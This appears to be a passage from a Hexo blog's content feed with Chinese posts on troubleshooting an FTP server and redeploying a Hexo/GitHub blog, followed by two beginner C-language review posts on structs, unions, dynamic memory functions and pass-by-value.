<p>在创建chroot_list文件，里面写入我们刚才创建的用户。</p>
<p>发现还是登录不了，这就坑了啊，我还以为密码错了试了半天，然后查了查是我们一开始创建的虚拟用户，selinux里面并没有配置的原因，找到/etc/shells 添加一下内容</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202104/image-20210330235704511.png" data-fancybox="group" data-caption="image-20210330235704511" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202104/image-20210330235704511.png" alt="image-20210330235704511" title="image-20210330235704511"></a></p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202104/image-20210330235754065.png" data-fancybox="group" data-caption="image-20210330235754065" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202104/image-20210330235754065.png" alt="image-20210330235754065" title="image-20210330235754065"></a></p>
<p>登录成功！</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202104/image-20210331000740632.png" data-fancybox="group" data-caption="image-20210331000740632" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202104/image-20210331000740632.png" alt="image-20210331000740632" title="image-20210331000740632"></a></p>
<h2 id="但是又有坑了。"><a href="#但是又有坑了。" class="headerlink" title="但是又有坑了。"></a>但是又有坑了。</h2><p>这里我一开始以为是权限的问题，后来我捣鼓了半天，换个FTP软件，就行了</p>
<p>这个问题存在在编码问题，我们知道windows跟Linux的编码在某些地方还是存在一些问题的，把编码改成utf-8就行了。</p>
<p>捣鼓了半天，后来朋友说用Docker多好，突然想到，然后又推荐了minio，后面有机会看看</p>
<p>//参考了了以下大佬的文章</p>
<p><a href="https://blog.csdn.net/qq_36938617/article/details/89077845" target="_blank" rel="noopener">https://blog.csdn.net/qq_36938617/article/details/89077845</a></p>
<h2 id="2-换一台机器部署遇到的那些坑"><a href="#2-换一台机器部署遇到的那些坑" class="headerlink" title="2 换一台机器部署遇到的那些坑"></a>2 换一台机器部署遇到的那些坑</h2><h3 id="2-1-重新装Git以及Nodejs"><a href="#2-1-重新装Git以及Nodejs" class="headerlink" title="2.1 重新装Git以及Nodejs"></a>2.1 重新装Git以及Nodejs</h3><p>​    这个问题还是因为当时考研，阿里的云服务器到期了之后，就没续费当时就把部署的文件夹备份了一下。打算日后在本地重新部署，或者自己做个Docker方便到哪里都可以用，本来想法挺简单，乍一看也没啥问题，但是我在最近几天恢复的时候该踩得坑是一个没有少。</p>
<p>首先问题是对于hexo init报错的问题</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202104/image-20210401135239316.png" data-fancybox="group" data-caption="image-20210401135239316" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202104/image-20210401135239316.png" alt="image-20210401135239316" title="image-20210401135239316"></a></p>
<p>注意我红框标出的内容。在Linux中是没有这个错误报告的，只有前面的，也没有提供错误代码，我不知道git高出了个啥，害得我用虚拟机捣鼓半天，还把上文部署好的centos给删了重新弄，最后实在照不出来哪里的问题，想想，这个也不是啥太重要的事，要不扔到windows上来吧，还简单，然后在windows上面也遇到了这个问题，不同的是windows给出了错误代码，指出了，问题所在，这可太棒了，这告诉我们了吗openssl的问题，这就是git这个玩意验证https的问题吗，叫我突然就想起来我大三，第一次配的时候也遇到过这个，脑瓜子嗡嗡的，但是当时没写文章，也没记录</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202104/image-20210401135634892.png" data-fancybox="group" data-caption="image-20210401135634892" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202104/image-20210401135634892.png" alt="image-20210401135634892" title="image-20210401135634892"></a></p>
<p>更改git配置，发现可以用了。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202104/image-20210401141822621.png" data-fancybox="group" data-caption="image-20210401141822621" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202104/image-20210401141822621.png" alt="image-20210401141822621" title="image-20210401141822621"></a></p>
<h3 id="2-2-连接到github的仓库"><a href="#2-2-连接到github的仓库" class="headerlink" title="2.2 连接到github的仓库"></a>2.2 连接到github的仓库</h3><p>我们初始化本地git的信息的时候第一次连接是需要验证的，之前我的blog介绍了迁移wp到hexo中提到了部署方式，但是现在我们在windows平台，所以呢就会有些不一样。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202104/image-20210401170044321.png" data-fancybox="group" data-caption="image-20210401170044321" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202104/image-20210401170044321.png" alt="image-20210401170044321" title="image-20210401170044321"></a></p>
<p>你直接输入是不行的，为啥？因为我们windows谁装个ssh啊，所以这个其实也没多大必要，直接跳过去。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202104/image-20210401170120882.png" data-fancybox="group" data-caption="image-20210401170120882" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202104/image-20210401170120882.png" alt="image-20210401170120882" title="image-20210401170120882"></a></p>
<p>生成秘钥</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202104/image-20210401170259987.png" data-fancybox="group" data-caption="image-20210401170259987" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202104/image-20210401170259987.png" alt="image-20210401170259987" title="image-20210401170259987"></a></p>
<p>我们看同样存在！</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202104/image-20210401170605743.png" data-fancybox="group" data-caption="image-20210401170605743" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202104/image-20210401170605743.png" alt="image-20210401170605743" title="image-20210401170605743"></a></p>
<p>连接成功！</p>
<p>本以为马上胜利了，突然临门一脚Git传不上去有没有</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202104/image-20210401172129130.png" data-fancybox="group" data-caption="image-20210401172129130" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202104/image-20210401172129130.png" alt="image-20210401172129130" title="image-20210401172129130"></a></p>
<p>给了错误，不给具体位置。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202104/image-20210401174840190.png" data-fancybox="group" data-caption="image-20210401174840190" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202104/image-20210401174840190.png" alt="image-20210401174840190" title="image-20210401174840190"></a></p>
<p>想到可能是版本问题吧，然后重新搞了一下版本问题，我去，这下原来的都没有了。心态炸了</p>
<p>在访问github又上不去了。。。。没梯子一言难尽等吧</p>
<p>·····················我是分界线··············································</p>
<p>漫长的30分钟过后终于上的去了github</p>
<p>我再次提交的时候发现了一个问题，github仓库里面，我的index.html居然是空的，怪不得</p>
<p>可能刚才网络波动导致传不上去？</p>
<p>再试一次居然成功了（这里我想起来一个插件没有装，可能也是这个插件带来的问题）</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202104/image-20210401180539322.png" data-fancybox="group" data-caption="image-20210401180539322" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202104/image-20210401180539322.png" alt="image-20210401180539322" title="image-20210401180539322"></a></p>
<p>终于搞定了！</p>
<p>经过两天的整修终于在本地测试通过了，但是还存在一些问题没有解决，正常的看文章啥的是没有问题，但是还没上传存储仓库后面不知道会有啥问题，还需要进一步探究。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>​      本次整修主要是在修复过程中遇到的一个问题，踩得坑啥的都弄了一遍，在国内翻了翻文章，发现这方面的东西居然少之又少，基本上很多都是一样的流程，模仿下来居然漏洞百出，通过问题一个一个的排查最终还是解决了这个问题。</p>
<p>总之在我们迁移一个github+hexo部署的博客的时候，应该重点关注以下几点，踩的坑我也在文中提出：</p>
<p>1.版本问题是重中之重，一定要注意你从前用的hexo，nodejs的版本，不然会带来很大的麻烦，这点如果你做php+nginx搭建一个wp的博客就知道了，php7.0以上的版本不自带对Mysql支持，也是一堆坑。</p>
<p>2.如果你是Linux系统，在配置的时候权限配置是十分重要的，不管对于ftp服务还是后面的upload等，不然会遇到更多问题。本文中我踩了一个windows与Linux编码转换的问题。</p>
]]></content>
      <categories>
        <category>胡乱折腾</category>
      </categories>
      <tags>
        <tag>blog</tag>
      </tags>
  </entry>
  <entry>
    <title>C语言+数据结构复习小记1</title>
    <url>/2020/03/01/C%E8%AF%AD%E8%A8%80+%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E5%B0%8F%E8%AE%B02/</url>
    <content><![CDATA[<h1 id="C语言-数据结构复习小记2"><a href="#C语言-数据结构复习小记2" class="headerlink" title="C语言+数据结构复习小记2"></a>C语言+数据结构复习小记2</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​            上回说到指针的一些内容，也简单的剖析了一下指针进一层的东西，相信能够帮助大家（特别是初学者）更好地理解指针，更快上手。这里我们继续向下进行复习回顾，来说一些我一开始作为小白比较懵逼的内容，毕竟这对我们的编程而言是十分重要的，并且对于我们的程序效率提升是大有帮助的。</p>
<h2 id="1-C语言的结构体，共用体"><a href="#1-C语言的结构体，共用体" class="headerlink" title="1.C语言的结构体，共用体"></a>1.C语言的结构体，共用体</h2><p>​        对于一个编程的初学者来说，结构体这一块如果乍一看其实挺懵逼的，但是我们换个角度想，这个就十分简单了。在学习C语言的过程中，我们肯定接触了C语言的类型啊，比如int（整型）char（字符型）等等，所谓结构体，其实我们大可以理解为我们自己创造的一个数据类型。</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Qinghua</span>&#123;</span></span><br><span class="line">	<span class="keyword">char</span> name;</span><br><span class="line">	<span class="keyword">int</span>  date;</span><br><span class="line"></span><br><span class="line">&#125;qinghua;</span><br></pre></td></tr></table></figure></div>

<p>我们看上面这一段代码，struct 声明结构体，Qinghua是我们的类型名称，就相当于我们的int(整型)，里面是我们对于我们自己创在的这个类型具体的内容，如果学过面向对象类的编程（PS：我不知道我这样类比准不准确），我们大可以认为我们定义了一个类。后面最后一行的qinghua就是我们的变量名字了！</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> qinghua;</span><br><span class="line">Qinghua  qinghua1;</span><br></pre></td></tr></table></figure></div>

<p>其实上面的代码，就相当于我们定义了一个类型，然后又那这个类型衍生出来一个变量。</p>
<p>另外一个跟结构体类似的就是我们所谓的Union（共用体）</p>
<p>关于Union我们看代码的定义方式</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> Data</span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">int</span> i;</span><br><span class="line">   <span class="keyword">float</span> f;</span><br><span class="line">   <span class="keyword">char</span>  str[<span class="number">20</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>这个跟我们的结构体是一样的，并且调用方式都是一样的都用成员访问  .   如果我们用指针我们用-&gt;来访问。</p>
<p>那么哪里跟结构体不同呢，我们来探讨一下。</p>
<p>我在网上找了一段代码，能够很好地说明这个区别，这里我们来看一下代码的结果以及我们的分析思考。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/%5Cimage-20200307234209587.png" data-fancybox="group" data-caption="image-20200307234209587" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/%5Cimage-20200307234209587.png" alt="image-20200307234209587" title="image-20200307234209587"></a></p>
<p>我们看我们这段代码里面利用了共用体，并且我们同时给共用体的里面的三个变量同时赋值。我们却发现打印出来的除了我们定义的最后的一个字符串是正确的其他的都错误了，为什么会这样呢？</p>
<p>其实这就是共用体的结果，共用体共用体，其实就是我们可以定义一个能够变换好多种类型的结构体。这里面我们看到最长的数据类型应该是字符串，并且我们对其全部赋值，然后覆盖了前面的内容，从而造成Int  float型数据失真了。</p>
<p>共用体使我们用来拿出来一个结构体其中一个变量的结构，他的大小所占字节通常是里面所占字节最多的数据类型。比如我们上图就是char（字符型）</p>
<h2 id="2-C语言内存管理"><a href="#2-C语言内存管理" class="headerlink" title="2.C语言内存管理"></a>2.C语言内存管理</h2><p>​        说实话，刚上大学的时候，我对计算机不管是软件硬件，一无所知，从前电脑在我手里就是打游戏的工具，我当时在开学之前自己了解了一下计算机专业，暑假买了本C语言，看了看，当时对于计算机一无所知的我，我好多地方超级懵逼，不懂计算机的组成原理，操作系统的原理，对于内存这玩意，我一直跟存储空间弄混淆。我那时候认为内存等价于存储空间，我真正明白了两者的区别还是在大一下学期，由于我从前打游戏比较多，我也很懒，我就想解放双手，写点脚本什么的，然后去网上看，说从汇编开始（网上教程易语言偏多，其实你要是玩的6，啥语言都能写，只要能够触及操作系统底层），买了本汇编的书，然后慢慢的深入，不懂得地方自己再去百度，反过头来一思考发现清晰了不少，这样叫我领悟了，计算机这东西，你动手去做，就会发现你的理解会更上一层楼，有自己的理解那种感觉，是真的很爽。好了，废话不多说了，此篇我会用我后来的理解来说以下C语言的这个对于跟我从前一样入门计算机的小白所碰到的懵逼事。</p>
<p>​    </p>
<h3 id="2-1-啥叫内存？"><a href="#2-1-啥叫内存？" class="headerlink" title="2.1 啥叫内存？"></a>2.1 啥叫内存？</h3><p>​        我们来说一说这个问题啊，啥叫内存。在我们印象里面内存都是这样的。</p>
<p>就好比我们做一个情景模拟（PS：这两个人是不懂计算机的外行人或者计算机的新手比如大一的我）</p>
<p>小王：你看我买了一个手机某PhoneX，内存128G</p>
<p>小李：哇，那么多，用的过来吗，你下多少小视频啊</p>
<p>此时一名大佬路过，偶然听到了这两个人的谈话，这兄弟一脸懵逼，现在技术这么猛了吗？个人机（保守点说，因为你不知道好多大佬他们能搞出什么东西来）弄128G的内存？？？</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/%5Cimage-20200308000631056.png" data-fancybox="group" data-caption="image-20200308000631056" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/%5Cimage-20200308000631056.png" alt="image-20200308000631056" title="image-20200308000631056"></a></p>
<p>对于我们一开始的外行人来说就是这样的，但其实这个东西叫存储空间，我们不知道怎么搞得传来传去就把这个叫内存了。（PS：这里我当时大一买U盘，就吃了没知识的亏，我居然相信有1T容量的U盘，现在想起来还很可笑，算是智商税了）</p>
<p>下面我们可能涉及到一些微机原理的内容，不要害怕，我会尽量用通俗易懂的语言来讲解这个东西。</p>
<p>我们的计算机在开机的时候，当我们执行一些任务，就需要与CPU交互就行计算处理，计算机的操作都是在CPU中进行二进制运算的运行的，虽然说CPU中有一些寄存器，但是这些寄存器是负责与芯片快速交互运算的其存取速度极高，与CPU相匹配，但是我们在执行大型任务，需要很多运算，频繁调用外部内容与内部交互，就需要一个能够与CPU运算速度进行匹配的存取空间，这个空间的最大特点就是尽量与CPU的速度匹配，但是我们现在的技术是很难做到的，于是人们发明了内存（这个还有很多的小分类）。</p>
<p>百度上面我看到过这样一个很生动的例子，在我们的书房，我们相当于CPU，我们的书架就是我们的存储空间，上面放着好多的书籍，我们要研究东西的时候，我们要把这些东西放到我们的桌子上面，我们的桌子就相当于内存。这样我们才能执行任务，这样是不是更加通俗易懂了一些呢，电脑的内存其实就是如此。</p>
<p>当我们运行C程序的时候他就会加载到内存，然后进行执行，不管多小的程序，只要执行，都会被加载到内存当中，执行完毕看情况释放内存。</p>
<p>C语言的函数给予了我们一些对内存进行操作的方法，这里比如说申请释放，这个会给我们的程序很大的便利。</p>
<table>
<thead>
<tr>
<th align="left">序号</th>
<th align="left">函数和描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left"><strong>void *calloc(int num, int size);</strong> 在内存中动态地分配 num 个长度为 size 的连续空间，并将每一个字节都初始化为 0。所以它的结果是分配了 num*size 个字节长度的内存空间，并且每个字节的值都是0。</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left"><strong>void free(void *address);</strong> 该函数释放 address 所指向的内存块,释放的是动态分配的内存空间。</td>
</tr>
<tr>
<td align="left">3</td>
<td align="left"><strong>void *malloc(int num);</strong> 在堆区分配一块指定大小的内存空间，用来存放数据。这块内存空间在函数执行完成后不会被初始化，它们的值是未知的。</td>
</tr>
<tr>
<td align="left">4</td>
<td align="left"><strong>void *realloc(void *address, int newsize);</strong> 该函数重新分配内存，把内存扩展到 <strong>newsize</strong>。</td>
</tr>
</tbody></table>
<p>这是我们C语言的一些内存函数。需要在“stdlib.h”中引用</p>
<p>那么这些东西我们怎么用呢？</p>
<p>我们来简单的说明一下，如果我们要定义一个班全体同学的姓名（这应该不超过50人），存放到一个数组里面，那么我们就直接给数组定义大小为50就行了，但是有一个问题，当这个班级后来过来了几个插班的同学，人数多了，那么原先的不够用啊，这个怎么办，如果往里面添加就会溢出，程序就会崩溃，那么有没有一种方法叫我们能够便利一些呢？当然有，就是我们的这个动态内存分配函数（其实也不是完全动态，他就是要了一块更大的内存存放这个东西，会填充为0全部都是，这里叫我有个想法，如果我们利用函数写死循环，然后无限要内存，会不会把机器要死掉？有时间在虚拟机上试一试），不够用继续给点。这里有一个问题，那就是操作系统不是会在程序运行结束之后自动释放内存吗？为什么还需要我们用函数释放内存，这个其实是为了叫我们的程序运行更加灵活流畅，你想想，如果内存满了，这个程序调用新的数据但是内存是满的进步来，这个程序就被挂起了，等待着其他的任务执行结束，才能进一步的继续运行，这样会很影响我们的程序运行速度。</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">char</span> name[<span class="number">100</span>];</span><br><span class="line">   <span class="keyword">char</span> *description;</span><br><span class="line"> </span><br><span class="line">   <span class="built_in">strcpy</span>(name, <span class="string">"Zara Ali"</span>);</span><br><span class="line"> </span><br><span class="line">   <span class="comment">/* 动态分配内存 */</span></span><br><span class="line">   description = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>( <span class="number">200</span> * <span class="keyword">sizeof</span>(<span class="keyword">char</span>) );</span><br><span class="line">   <span class="keyword">if</span>( description == <span class="literal">NULL</span> )</span><br><span class="line">   &#123;</span><br><span class="line">      <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Error - unable to allocate required memory\n"</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">      <span class="built_in">strcpy</span>( description, <span class="string">"Zara ali a DPS student in class 10th"</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"Name = %s\n"</span>, name );</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"Description: %s\n"</span>, description );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这段代码给我们弄了一个引用内存管理函数的例子，这个例子中我们申请了一段内存空间大小为char的长度乘以200.</p>
<p>这个操作我们可以利用表中的1 还有3这两个函数进行操作，这两个函数都是要一块内存空间，那么这两个函数有什么区别呢？malloc函数在要内存时候，是没有初始化的，也就是内存有东西，这个东西是什么，我们不知道。而calloc在要这块内存之后，会进行初始化，全部用0填充。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/%5Cimage-20200308183933825.png" data-fancybox="group" data-caption="image-20200308183933825" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/%5Cimage-20200308183933825.png" alt="image-20200308183933825" title="image-20200308183933825"></a></p>
<p>当然，我们也可以重新的调整并且释放内存。</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">char</span> name[<span class="number">100</span>];</span><br><span class="line">   <span class="keyword">char</span> *description;</span><br><span class="line"> </span><br><span class="line">   <span class="built_in">strcpy</span>(name, <span class="string">"Zara Ali"</span>);</span><br><span class="line"> </span><br><span class="line">   <span class="comment">/* 动态分配内存 */</span></span><br><span class="line">   description = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>( <span class="number">30</span> * <span class="keyword">sizeof</span>(<span class="keyword">char</span>) );</span><br><span class="line">   <span class="keyword">if</span>( description == <span class="literal">NULL</span> )</span><br><span class="line">   &#123;</span><br><span class="line">      <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Error - unable to allocate required memory\n"</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">      <span class="built_in">strcpy</span>( description, <span class="string">"Zara ali a DPS student."</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">/* 假设您想要存储更大的描述信息 */</span></span><br><span class="line">   description = (<span class="keyword">char</span> *) <span class="built_in">realloc</span>( description, <span class="number">100</span> * <span class="keyword">sizeof</span>(<span class="keyword">char</span>) );</span><br><span class="line">   <span class="keyword">if</span>( description == <span class="literal">NULL</span> )</span><br><span class="line">   &#123;</span><br><span class="line">      <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Error - unable to allocate required memory\n"</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">      <span class="built_in">strcat</span>( description, <span class="string">"She is in class 10th"</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"Name = %s\n"</span>, name );</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"Description: %s\n"</span>, description );</span><br><span class="line"> </span><br><span class="line">   <span class="comment">/* 使用 free() 函数释放内存 */</span></span><br><span class="line">   <span class="built_in">free</span>(description);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>​        本节我们简单探讨了一下C语言结构体和内存的一些问题作用，也简单的做了一下解释，后面我们会深入到C语言的一些排序算法，有些书籍会在C语言的教程中给出，有些也会在数据结构中给出，不过这个是我们深入学习编程的基础，下节见！</p>
]]></content>
      <categories>
        <category>胡乱折腾</category>
      </categories>
      <tags>
        <tag>c语言</tag>
      </tags>
  </entry>
  <entry>
    <title>C语言+数据结构复习小记1</title>
    <url>/2020/02/28/C%E8%AF%AD%E8%A8%80+%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E5%B0%8F%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="C语言-数据结构复习小记1"><a href="#C语言-数据结构复习小记1" class="headerlink" title="C语言+数据结构复习小记1"></a>C语言+数据结构复习小记1</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​        最近由于一些原因，要用到C语言，由于学习C语言是大概三年前了，后来学习了python，JS之后就很少用到C了，考研的时候由于没选择数据结构，也是没有用到C语言。C语言作为操作系统的底层语言（对于C以及Linux系统而言），以及内核级别的操作有着很大的作用，当然也被大家很多人作为第一门编程语言学习。废话不多说，特此记录一下这一段时间复习C语言，以及个人对于一些问题的见解，提出来与大家交流一下。</p>
<h2 id="1-C语言基础训练"><a href="#1-C语言基础训练" class="headerlink" title="1.C语言基础训练"></a>1.C语言基础训练</h2><p>​    由于是复习，对于基础问题我们不做深究（PS：什么主函数，什么基本输入输出库啊，包括安装），这里我们就来探讨一下当时我在第一次学习C语言的时候几个我第一次学习比较懵逼的点，这些东西有些比较抽象。（PS：当时第一次学对于*  **这种调用指针的方法当时提出了自己的一些理解，但是感觉不够透彻，后来买了本汇编语言看完之后，感觉清新了不少）</p>
<h3 id="1-1传值与引用调用"><a href="#1-1传值与引用调用" class="headerlink" title="1.1传值与引用调用"></a>1.1传值与引用调用</h3><h4 id="1-1-1传递调用"><a href="#1-1-1传递调用" class="headerlink" title="1.1.1传递调用"></a>1.1.1传递调用</h4><p>在我们应用函数的时候，我们考虑两种调用方法，一种是传值一种是引用。</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdio.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> t;</span><br><span class="line">  t=a;</span><br><span class="line">  a=b;</span><br><span class="line">  b=t;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"a is%d\n"</span>,a);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"b is%d\n"</span>,b);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> a =<span class="number">100</span>;</span><br><span class="line"><span class="keyword">int</span> b =<span class="number">200</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"a is%d\n"</span>,a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"b is%d\n"</span>,b);</span><br><span class="line"></span><br><span class="line">swap(a,b);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"a is%d\n"</span>,a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"b is%d\n"</span>,b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/image-20200228160909501.png" data-fancybox="group" data-caption="image-20200228160909501" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/image-20200228160909501.png" alt="image-20200228160909501" title="image-20200228160909501"></a></p>
<p>简单来说我们看到代码执行结果，调用函数，函数内部进行了交换，输出，在函数内部数值确实发生了变化，但是呢，主函数中的A,B值没变，到了这里，肯定有很多人摸不到头脑，这里我们站到内存的角度剖析一下。</p>
<p>C语言中我们学习会接触到形式参数，还有实际参数，简称形参实参。</p>
<p>形式参数就像名字一样是个形式，实际参数就很实际存在。</p>
<p>我们来看看两者的差别</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/image-20200228170702260.png" data-fancybox="group" data-caption="image-20200228170702260" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/image-20200228170702260.png" alt="image-20200228170702260" title="image-20200228170702260"></a></p>
<p>​    如图，我们看第一张图，实际上形参只能在函数内部生效，当函数执行完毕的时候这个参数占用的内存就被收回了。当发生了函数调用，向左边一样，就会在内存中在加入一个临时占用的内存空间，然后将实参的值传递给形参，调用结束后形参消失。在这里我们理解到，实际参数必须是实际存在的，也必须是一个确切的值。当然，这个过程必须是单向的，即只能由实参传递给形参（试想形参本来就是后来出现的，是被调用函数过程中加入的），并且两者类型也必须匹配。另外实参与形参的命名是不受影响的，比如我们的例子中都叫a,b是不冲突的。</p>
<p>  在这里我们看到这里的数值实际上是通过实际参数传递给形式参数调用的，故我们称此种调用方法为传递调用。</p>
